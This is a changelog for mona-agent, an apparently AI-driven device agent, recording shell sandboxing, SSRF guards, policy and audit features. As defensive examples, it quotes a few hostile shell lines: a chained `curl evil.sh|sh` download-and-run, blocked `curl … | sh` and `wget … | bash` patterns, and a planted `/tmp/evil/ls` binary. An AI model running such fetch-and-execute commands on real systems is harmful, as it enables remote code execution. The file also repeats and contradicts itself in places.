# Changelog

All notable changes to mona-agent are documented here. The format is
based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## Unreleased — security hardening

### Added
- Ed25519 device identities with signed enrollment, tenant binding, public-key fingerprints, credential lifecycle metadata, rotation, revocation, and timing-safe verification.
- Durable tenant-scoped policy registry with immutable monotonic revisions, activation/rollback, atomic persistence, and audit-chain records.
- Tenant-aware fleet/JIT administration and policy operations through `FleetController` and `AdminApi`.
- Release/update SHA-256 verification, installer checksum enforcement, and Sigstore release-workflow groundwork.
- Prompt-injection trust-boundary rules separating user/policy authority from untrusted web, file, email, plugin, and tool content.
- Security review scope, release distribution checklist, and public security-review intake artifacts.

### Security
- **Shell allowlist bypass via path-qualified binaries**: a user-writable file
  named like an allowlisted binary (e.g. `/tmp/evil/ls`) no longer executes —
  `resolveBinary` now requires a path-qualified call's realpath target to live
  under a trusted system PATH entry.
- **`shell.unsafe` denied instead of allowed**: the unsafe tier now returns
  `allowed: true`, so the mode that is supposed to release the shell no longer
  blocks it.
- **Fail-open remote capability extension closed**: the control plane's
  `capabilities.shell.allow` / `capabilities.paths.allow` fields were applied
  directly. They are replaced by a signed, device-verified capability grant
  that is intersected with an owner-configured ceiling (deny-by-default). See
  `docs/DEVICE-LIFECYCLE.md`.
- **MCP HTTP transport authenticated**: the localhost MCP server now requires
  a per-start bearer token, whitelists the `Host` header (kills DNS rebinding)
  and rejects browser `Origin` requests.
- **Windows DPAPI credentials persisted**: the encrypted blob and its scope are
  written to disk (0600, atomic) so credentials survive a restart, and legacy
  migration only renames the old file after a verified disk read-back.

### Fixed
- Policy `when.includes` required every substring (a spread bug read only the
  first); `explain()` no longer consumes a rate-limit token; the audit chain
  tip is recovered from disk before each append so a daemon and CLI cannot
  break the chain.
- Tool policy was checked twice per call (daemon + `tools.run`); `tools.run`
  is now the single choke point and also applies shell deny/approval patterns
  on the MCP path.
- Shell pipeline results now carry `timedOut`/`truncated`.
- Plugin discovery no longer imports from `process.cwd()`; the installer
  defaults to the latest release tag (branches require `--branch`).

### Verification
- Full test suite: **472 passed, 0 failed**.
- This release does not claim an independent security audit, hardware-backed key storage, complete SSO/SCIM integration, or external community validation.

## [2.11.0] — 2026-08-17

### Added
- **`mona-agent doctor`** (`apps/desktop/src/doctor.js`): one-shot local
  diagnostics — node version, ~/.mona-agent state, credentials, policy
  parse, audit-chain verify, workspace, BYO provider, control-plane
  reachability, installed version, update availability. Non-zero exit on
  any failed check.
- **Localhost health + metrics** (`apps/desktop/src/metrics.js`):
  `MONA_METRICS_PORT` starts `/healthz` and Prometheus-text `/metrics`
  bound to 127.0.0.1 only — systemd/Docker healthchecks and local
  scrapers; the daemon stays egress-only.
- **HTTP MCP transport**: `mona-agent mcp --http [--port N]` — POST /mcp
  JSON-RPC + GET info/healthz, localhost-bound.
- **Optional OTel spans** (`apps/desktop/src/otel.js`): `task.run` and
  `tool.*` spans when `@opentelemetry/api` is installed; complete no-op
  otherwise (no new dependencies).
- **Hardened systemd unit** (via `mona-agent daemon install`):
  NoNewPrivileges, PrivateTmp, ProtectSystem=strict,
  ProtectHome=read-only + ReadWritePaths=%h/.mona-agent, MemoryMax=1G.
- **Installer hardening** (`apps/desktop/install.sh`): `--version <tag>`
  pins a release, SHA-256 verification against the release SHA256SUMS
  asset (`MONA_REQUIRE_CHECKSUM=1` hard-fails), extracted-version check,
  `--dry-run`, refuses root unless `--allow-root`.
- **Docker**: non-root multi-stage `Dockerfile` (HEALTHCHECK on
  /healthz) + `docker-compose.yml` (read-only rootfs, tmpfs, persistent
  state volume, host-loopback metrics port).
- **`.github/workflows/release.yml`**: on tag push, packs the source
  tarball, computes SHA256SUMS and attaches both to the GitHub release.
- Tests: metrics (4), doctor (5), otel (2), mcp-http (1) — suite 339
  green.

## [2.10.1] — 2026-08-17

### Added
- **BYO local brain transport** (`apps/desktop/src/transport/local.js`):
  run the reasoning loop on-device against a user-supplied LLM —
  `anthropic` (Messages API), `openai` (any OpenAI-compatible
  `/chat/completions` endpoint: OpenAI, OpenRouter, Groq, LM Studio,
  vLLM), and `ollama` (fully offline, $0). Streaming with usage mapping
  to the engine's `{input, output, total, costUsd}` shape; per-model
  price tables (overridable per provider) feed the budget governor, so
  BYO runs get the same cost governance as vault runs. Config in
  `~/.mona-agent/provider.json` (0600) with env fallbacks; the cloud can
  never read it.
- **`mona-agent provider` CLI**: `set <anthropic|openai|ollama>
  [--key|--url|--model]`, `status` (masked key, model, pricing),
  `unset`, `test` (one-shot smoke call).
- **`MONA_TRANSPORT=local`** — fail-fast local-only brain mode; the
  daemon refuses to start when no provider is configured.
- **Daemon brain dispatch** (`agent.js#brainThink`): every think — main
  loop, forced conclusion, verification pass, delegate sub-agents and
  workflow sub-agents — routes through the BYO provider when configured;
  prompts never leave the device. `usageTotals` now carry `costUsd`
  through to the run trace and audit log.
- **MCP transport** (`apps/desktop/src/transport/mcp.js` + `mona-agent
  mcp`): Model Context Protocol stdio server (JSON-RPC 2.0) exposing the
  tool registry to any MCP client — `initialize`, `tools/list`
  (freeform args → JSON Schema), `tools/call`, `ping`. Every call passes
  the same local policy gate as cloud tasks.
- **Examples**: `scripts/disk-watchdog.sh` (cron recipe — alerts before
  a volume fills), `scripts/morning-briefing.sh` (8am briefing),
  `examples/providers/` (BYO templates: anthropic, openai-compatible,
  ollama).
- **`docs/PRICING.md`** — SaaS pricing & metering spec for the control
  plane (tiers, metering events, Stripe mapping, BYO economics).
- Tests: `local-provider.test.mjs` (14) + `mcp.test.mjs` (9) — full
  suite 327 green.

### Changed
- README/docs updated: BYO on-device brain and MCP are shipped, not
  roadmap; offline FAQ now documents the Ollama path.

## [Unreleased]

### Added
- **Vector indexing (dependency-free, local).** New engine module
  `packages/engine/src/vector.js`: a deterministic hashing-trick embedding
  (256-dim signed feature vectors, djb2 + fnv1a), cosine similarity scoring,
  persistent JSON index (0600), TTL, dedupe-by-merge. No API keys, no
  network, no npm dependencies.
- **`vector` tool** (`apps/desktop/src/tools/vector.js`): `remember` notes,
  `index` workspace files (chunked, binary-safe, workspace-confined),
  `search` in natural language, `list` / `stats` / `forget`.
- **Vector recall in prompts**: `MemoryStore.recall` now scores by hybrid
  vector + recency + hit boost (legacy entries embedded lazily), and the
  daemon injects vector-searched context into every task's system prompt.
- **Serial task queue** (`apps/desktop/src/taskqueue.js`): tasks run one at
  a time in arrival order; waiting tasks report their position; steps from
  different tasks can never interleave.
- **Context compaction** in the engine loop: when a task's message history
  exceeds a character budget, old tool results are compressed (head + recent
  tail always survive verbatim) — long tasks no longer risk blowing the
  brain's context window. Visible via `task.compact` step + audit entry.
- **Local task audit**: every task event (start / think / tool / result /
  denied / compact / verify / answer / error) is written to the same
  hash-chained `~/.mona-agent/audit.jsonl` used for policy decisions —
  `mona-agent audit tail|verify` now covers the full task trail.
- **`jobs` tool — background command management** (`apps/desktop/src/tools/jobs.js`):
  long-running work no longer blocks the task loop or dies with the 15s shell
  timeout. `jobs start <cmd> [cwd]` returns a job id + pid immediately,
  `status <id>`, `output <id> [tail]`, `list`, `wait <id> [timeoutS]` and
  `kill <id>` manage it — the same job lifecycle a harness exposes to the
  brain. Background commands route through the *same* security surface as
  the shell tool (argv parsing, allowlist, blocked patterns, scrubbed env)
  and honour the shell policy tier, so a background command can never widen
  device policy. The tool registry now supports per-tool timeouts (jobs may
  wait up to 130s; every other tool keeps the 30s default).
- **`delegate` tool — sub-agent fan-out** (`packages/engine/src/delegate.js` +
  `apps/desktop/src/tools/delegate.js`): the brain splits a task into up to
  six independent sub-tasks (`[{id, prompt}]`) that run **concurrently** as
  fresh, bounded `TaskLoop`s with their own message context — sharing the
  same policy, budget and tool sandbox. Every sub-result returns
  `{status, answer, steps, usage, trace}` so the parent verifies each piece
  before answering; failed sub-agents are reported, never hidden. Sub-steps
  land in the local hash-chained audit log (`kind: subtask`). Delegation is
  depth-limited (max 2 levels) so it can never nest into runaway recursion,
  and sub-loops respect policy exactly like the main loop.
- **`goal` tool — persistent multi-round objectives** (`packages/engine/src/goal.js` +
  `apps/desktop/src/tools/goal.js`): the brain starts a long-running
  completion objective (`goal start {objective, maxRounds?}`) that keeps
  going across **autonomous rounds** until it is genuinely complete — each
  round runs as a normal queued task (serial, never interleaving with user
  tasks) seeded with the objective + every previous round's summary, and
  must end with a `GOAL_COMPLETE: true|false` marker. `goal status/list/
  resume/abort` manage it; goals persist to `~/.mona-agent/goals.json`
  (0600, atomic writes, per-path in-process singleton so the tool and the
  daemon always agree) and survive daemon restarts. Round cap reached
  without completion → `blocked`.
- **`workflow` tool — multi-phase orchestration** (`packages/engine/src/workflow.js` +
  `apps/desktop/src/tools/workflow.js`): ordered pipelines of phases
  (`[{name, tasks, context?, concurrency?}]`, max 8 phases × 6 tasks), each
  phase fanning out to concurrent sub-agents on the same `runSubtasks`
  machinery. A **barrier** sits between phases — a phase starts only after
  the previous phase's results exist — and a phase can declare
  `context: ["phaseName"]` to have earlier results injected into every
  sub-agent's prompt (research → synthesize → verify). Results are
  structured per phase and per task; failing sub-tasks are reported in
  place (`status: partial`) and never abort the workflow.
- **`plugin` tool + dynamic plugin registry** (`apps/desktop/src/tools/plugin.js`,
  `apps/desktop/src/tools/index.js`): third-party tools ship as packages
  (`mona-agent-tool-*` or any dir on `MONA_TOOL_PATH`) exporting
  `defineTool()` descriptors, and are **hot-loaded at runtime** — at daemon
  start and on demand. The runtime registry now accepts descriptors (lifted
  to the legacy shape), reports per-tool source (`builtin`/`plugin`) and
  policy tier, and refuses collisions (a plugin can never override a
  builtin). `plugin list|load|reload|remove` manages them. Plugin tools are
  **denied by default**: the owner allows one with an explicit
  `"tools": {"my.tool": "allow"}` policy rule — `plugin list` prints the
  exact rule needed. The daemon advertises loaded plugins to the cloud on
  connect.

### Changed
- `MemoryStore` recall is vector-based while keeping the same on-disk format
  and public API — existing memory files work untouched.
- Tools list now advertises `vector` to the cloud brain.
- **End-to-end engine integration test** (`apps/desktop/test/e2e-engine.test.mjs`):
  the real `TaskLoop` drives the real tool registry through the real policy
  gate — a scripted brain starts and waits on a background job, queries
  plugins, then answers, proving the whole smartness chain works as the
  daemon uses it.

## [2.8.3] — 2026-08-16

### Added
- Dashboard-driven version lifecycle: `!cmd version|update|status` system
  commands handled locally on the device (zero tokens, never reach the
  brain). Server `GET /agents` now surfaces `version`, `last_seen`,
  `online`; `POST /agents/:id/update` queues a self-update; agents UI shows
  the agent version + live badge + Update button.

### Fixed
- `mona-agent update` now verifies the extracted archive version matches
  the requested tag (guards against stale GitHub CDN archives).
- Pre-existing broken `open` allowlist test (duplicate block + wrong
  export) — suite green again.

## [2.8.2] — 2026-08-16

### Added
- Version lifecycle foundation: single source of truth (`src/version.js`
  reads root `package.json`), `mona-agent version`, `mona-agent update
  [check]` (GitHub release feed with tag fallback, self-update with
  rollback on failure, lifecycle record `~/.mona-agent/update.json`).
- Dashboard `update` + `version` commands over the control channel.

## [2.8.1] — 2026-08-16

### Fixed
- Shell allowlist: `open` added to the macOS default allowlist — the agent
  can launch apps/URLs (`open -a Calendar`) out of the box.

## [2.8.0] — 2026-08-16

### Security
- argv shell: quote-aware parsing, `execFile/spawn shell:false`, realpath
  allowlist per segment, scrubbed child env, process-group kill on timeout,
  redirects/`$()`/backticks rejected. `MONA_SHELL_UNSAFE` env var
  deprecated → policy `shell.unsafe` (audited).
- net: DNS resolved by agent, every address CIDR-checked, connect-to-IP +
  Host/SNI, redirect revalidation (max 5), metadata endpoints blocked,
  bounded body reads.
- files: O_NOFOLLOW + fstat TOCTOU guard, special-file refusal, trash-based
  delete, try/catch contract.
- policy v2: hash-chained append-only audit log (`mona-agent audit
  tail|verify`), per-tool rate limits, strict/standard/permissive presets,
  `explain()`, registry-wide policy choke point.

### Added
- CLI: `policy status|explain|preset`, `audit tail|verify`.
- CI: Node 20/22/24 × ubuntu/macos, npm audit job, dependabot, SHA-pinned
  actions.
- Tests: 162 green incl. 58-case red-team suite.

## [2.7.0] — 2026-08-16

### Added
- Wire engine + protocol into the daemon — one core, one wire contract.

## Earlier

- v2.0.0–v2.6.x: initial releases (control plane, device daemon, TUI,
  skills, policy v1, hash-chained audit, mTLS identity, sandboxing).

---

## Historical (pre-hardening rounds)

## v2.8.1

- **macOS app launcher**: `open` added to the default shell allowlist —
  the agent can now launch apps, files and URLs (e.g. `open -a Calendar`)
  out of the box. Everything still runs through the same argv-based
  sandbox: realpath resolution, scrubbed env, per-segment allowlist.

## v2.8.1

- **macOS app launcher**: `open` added to the default shell allowlist —
  the agent can now launch apps, files and URLs (e.g. `open -a Calendar`)
  out of the box. Everything still runs through the same argv-based
  sandbox: realpath resolution, scrubbed env, per-segment allowlist.

## v2.8.0 — hardened core (security pass)

- **Shell: argv execution, no string-to-shell.** Commands are parsed into
  argv arrays (quote-aware) and executed via `execFile`/`spawn` with
  `shell: false`. Chains (`&&`, `||`, `;`) and pipes (`|`) are supported but
  EVERY segment's executable must pass the allowlist — `df; curl evil.sh|sh`
  is now structurally impossible, not just regex-blocked. Redirects, `$(...)`,
  backticks and env-assignment prefixes are rejected.
- **Binaries resolved to realpath before execution**; allowlist matches the
  resolved absolute path, not a substring of the command string.
- **Scrubbed child environment** — only `PATH/HOME/LANG` (+ a few safe vars)
  leak into children; API keys and other secrets never do. Only allowlisted
  env vars (`$HOME`, `$PATH`, …) are expanded; everything else stays literal.
- **Process-group kill on timeout** — the whole tree dies, no orphans.
- **`MONA_SHELL_UNSAFE=1` is deprecated.** Unrestricted shell is now a
  policy decision (`"shell": {"unsafe": true}` in `policy.json`) that is
  audited. The env flag still works for one minor version with a warning.
- **SSRF-safe networking.** `net` and `web` now resolve DNS themselves,
  verify EVERY address against blocked ranges (loopback, private, link-local,
  metadata, CGNAT, reserved, IPv6 equivalents), connect to the validated IP
  with Host header + TLS SNI, re-validate every redirect hop (max 5), block
  cloud metadata endpoints by name and IP, and cap response size (no
  decompression bombs). No env bypass exists.
- **Files: TOCTOU + special-file hardening.** Files are opened with
  `O_NOFOLLOW` and the opened descriptor is verified — no symlink swap
  between check and open. FIFOs, devices and sockets are refused. Deletes
  move to `~/.mona-agent/trash` by default (`purge: true` for permanent).
- **Policy engine v2** — every decision is written to a hash-chained,
  append-only audit log (`~/.mona-agent/audit.jsonl`; verify with
  `mona-agent audit verify`); per-tool rate limits (`rateLimits`); presets
  `strict` / `standard` / `permissive` (`mona-agent policy preset`);
  `mona-agent policy explain <tool>` shows exactly which rule fired.
- **Policy choke point in the tool registry** — every invocation (daemon,
  brain loop, `exec` CLI) passes the local policy engine. The control plane
  can never widen it.
- **CI** — matrix Node 20/22/24 × Ubuntu/macOS, dependency audit job
  (`npm audit --audit-level=high`), dependabot, actions pinned to commit SHAs.
- **Red-team test suite** — `apps/desktop/test/security.test.mjs`: 58
  adversarial cases (command injection, allowlist bypass, pipe-to-shell,
  path traversal, symlink escape, SSRF incl. DNS-rebinding simulation and
  redirect-to-metadata, FIFO refusal, audit-chain tampering, rate limits).
  Full suite: 162 tests green.

## v2.7.0

- **Dead weight wired up** — `packages/engine` and `packages/protocol` are
  now the single source of truth the daemon runs on; the inline loop and
  hand-rolled wire format are gone:
  - The agentic loop (plan → act → reflect → answer) now runs on the shared
    **TaskLoop** engine core — policy checks on every tool call, corrective
    nudges, budget steering and a forced conclusion are engine guarantees,
    not daemon habits
  - **Policy-as-code** — `~/.mona-agent/policy.json` (or `MONA_POLICY`) now
    governs tool authorization (`allow`/`deny`/`confirm`), shell patterns and
    daily budget caps; safe defaults apply when no file exists
  - **Budget governor** — daily token/cost caps degrade the reasoning profile
    (normal → eco → critical → exhausted) and block new tasks when spent;
    usage is reported in `stats` and streamed to the dashboard
  - **Structured memory** — the engine's `MemoryStore` (dedupe, TTL, scored
    recall) now auto-remembers finished tasks and injects recalled context
    into future prompts alongside the markdown memory tool
  - **Shared wire contract** — every outbound frame is a versioned envelope
    from `@mona/protocol`; inbound frames with an unknown protocol version
    are rejected at connect time (close code 4002); `agent.log` type added
  - **Lenient parser merged upstream** — the battle-tested brain-reply parser
    (balanced-brace extraction, broken-JSON salvage, reasoning preserved on
    tool calls) now lives in the engine, so the daemon and any future client
    parse identically
- **Skills tests fixed** — test isolation from the real `~/.mona-agent` config
- Test suite grew 58 → 104 (engine loop/parser, protocol contract, skills);
  all green on Node 20/22

## v2.6.0

- **Always-visible progress** — every think step now emits `task:step
  (i/maxSteps)`, so a task can never appear stuck or loop without output
- **Professional README** — five promises: saves money (cheap-first model
  routing, per-run cost traces), zero API keys on device, fully transparent,
  never loops silently, controlled exclusively via agent.mona.expert


## v2.5.0

- **Files sandbox hardened** — fixed a path-boundary bug that could let a
  `../workspace-evil` sibling path escape the workspace; symlink escapes are
  now rejected (realpath check on every access); writes are capped at 1 MB;
  deleting the workspace root is refused
- **Shell guard extended** — `poweroff`/`reboot`/`halt` and pipe-to-shell
  downloads (`curl … | sh`, `wget … | bash`) are now always blocked
- **New tool: `notify`** — desktop notifications (macOS osascript, Linux
  notify-send, Windows msg) with strict shell-metacharacter sanitization
- **Version alignment** — device-reported version now 1.6.0 (was stale 1.5.0,
  out of sync with the desktop package)


## v2.4.0

- Multi-device platform — devices register as first-class entities (name,
  platform, metrics, online status), agents are assigned to devices, and the
  dashboard groups agents by device with per-device telemetry
- Device-aware task routing — a device only sees tasks for agents assigned to
  it; unassigned agents run on any online device
- Atomic task claims — the claim response now tells the device whether it
  actually won the task (claimed true/false), so multiple devices can never
  execute the same task twice
- Run traces now record the executing device and keep the real agent identity


## v2.3.0

- Persistent memory injection — the brain loads your memory notes at every
  task start and keeps them updated, so the agent gets smarter with each task
- Few-shot exemplars in the system prompt — the reasoning protocol is shown
  by example, improving JSON compliance and reasoning quality (~150 tokens)
- Actor-critic verification — every final answer is checked by the strongest
  available model, no matter which model did the actual work
- Uncertainty rule — unverifiable facts are reported honestly instead of
  guessed


## v2.2.0

- Deep reasoning engine: plan → act → reflect → verify loop with visible
  reasoning at every step
- Auto brain mode: per-task smart/cheap balancing (step budget, verification,
  provider routing) — simple tasks stay cheap, complex tasks go deep
- Live debug log, per-run traces with tokens/cost/latency, insights graphs
- Training export (JSONL) with human feedback ratings
- Premium plans via the Sngine package framework (limits, plan-aware brains)
- Compliance documentation suite (CRA, ISO 27001, IEC 62443, GDPR, SBOM)


All notable changes to the mona-agent client are documented here.
Format: [Keep a Changelog](https://keepachangelog.com), versioning:
[SemVer](https://semver.org).

## [2.1.0] — 2026-08-13

### Added

- **Agentic execution loop** — the device is no longer a listener; it's an
  operator. Tasks from the dashboard flow into a cloud task queue, the
  device claims them within seconds, and the mona.expert brain plans the
  work: think  act  observe  deliver. Up to 8 tool steps per task, with
  every step streamed to the dashboard activity feed in real time.
- **Cloud task queue (WS-free command channel)** — devices poll for work
  every 2 s over HTTPS, so command execution works on every hosting
  setup. No inbound ports, no WebSocket upgrade required.
- **Tools-on-demand protocol** — one system prompt, four tools
  (`sysinfo`, `shell`, `files`, `net`). The brain replies in plain text or
  a single JSON tool call — provider-agnostic by design.
- **Live execution trace** — `tool.call` / `tool.result` events land in
  the dashboard feed as they happen.
- **Persistent conversations** — every task and its answer are stored in
  the cloud conversation, so chat history survives restarts.

## [2.0.0] — 2026-08-13

### Added

- **HTTP metrics pipeline** — device metrics (CPU, memory, disk, load,
  uptime, host info) stream to the cloud every 10 s via HTTPS POST,
  independent of the WebSocket channel. Live monitoring works on every
  hosting setup, including shared hosting without WS proxying.
- **Resilient control channel** — WebSocket upgrade is detected at runtime;
  when unavailable the daemon transparently keeps streaming over HTTPS and
  skips the reconnect storm.
- **Local dashboard API** — the daemon serves a localhost API + WebSocket
  for the terminal dashboard and desktop UI.
- Extended device metrics: CPU %, load average, memory, disk, uptime,
  CPU model, core count.
- Monorepo layout: `apps/desktop` (agent), `packages/engine` (cloud-brain
  client), `packages/protocol` (message schemas).
- One-line installer with PATH persistence for zsh/bash/profile.

### Changed

- Repo is now **client-only** (SaaS boundary) — server-side code moved to a
  private codebase.
- `mona-agent login` flow stores credentials outside the install dir.

## [1.x] — earlier

### Added

- Terminal dashboard (TUI): live log, auto-follow, scrollback, status.
- Tool sandbox: files, shell (guarded), net, sysinfo.
- Control-plane protocol: register, chat RPC, LLM proxy.
- Docker-platform protocol support (self-hosted control plane).

## Changelog links

[2.1.0]: https://github.com/MONAEXPERT/agent/releases/tag/v2.1.0
[2.0.0]: https://github.com/MONAEXPERT/agent/releases/tag/v2.0.0
